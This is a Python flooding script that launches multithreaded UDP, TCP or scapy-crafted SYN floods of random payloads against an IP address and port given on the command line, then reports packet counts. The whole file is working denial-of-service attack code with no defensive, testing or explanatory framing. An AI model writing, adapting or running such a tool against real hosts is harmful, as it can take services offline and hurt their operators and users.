import os
import sys
import time
import random
import socket
import threading
from scapy.all import *

number_packets = 0
volume = 0

def udp_flood(ip, port):
	global number_packets, volume

	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			data = random._urandom(1024)

			while True:
				try:
					s.sendto(data, (ip, port))

					number_packets += 1
					volume += 1024
				except Exception as error:
					s.close()
					print(error)
					break
		except:
			s.close()

def tcp_flood(ip, port):
	global number_packets, volume

	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))

			data = random._urandom(1024)

			while True:
				try:	
					s.send(data)

					number_packets += 1
					volume += 1024
				except:
					print("[!] Unknown error!")
					s.close()
					break
		except:
			print("[!] Unknown error!")
			s.close()

def syn_flood(target_ip, target_port):
	global number_packets, volume

	src_ip = RandIP()

	ip = IP(dst=target_ip)

	tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

	raw = Raw(b"X" * 1024)

	packet = ip / tcp / raw

	while True:
		try:
			send(packet, count=100, verbose=0)
			
			number_packets += 100
			volume += 102400
		except:
			print("[!] Unknown error!")

def main():
	method = sys.argv[1]
	ip = sys.argv[2]
	port = int(sys.argv[3])
	threadings_number_packets = int(sys.argv[4])
	duration = int(sys.argv[5])

	print("[!] Starting...")

	for i in range(threadings_number_packets):
		if method.lower() == "udp":
			threading.Thread(target=udp_flood, daemon=True, args=(ip, port)).start()
		elif method.lower() == "tcp":
			threading.Thread(target=tcp_flood, daemon=True, args=(ip, port)).start()
		elif method.lower() == "syn":
			threading.Thread(target=syn_flood, daemon=True, args=(ip, port)).start()

	print("[!] Started")

	start_time = time.time()

	while time.time() - start_time < duration:
		time.sleep(1)

	print(f"Number: {number_packets} packets")
	print(f"Volume: {volume} bit")

if __name__ == "__main__":
	main()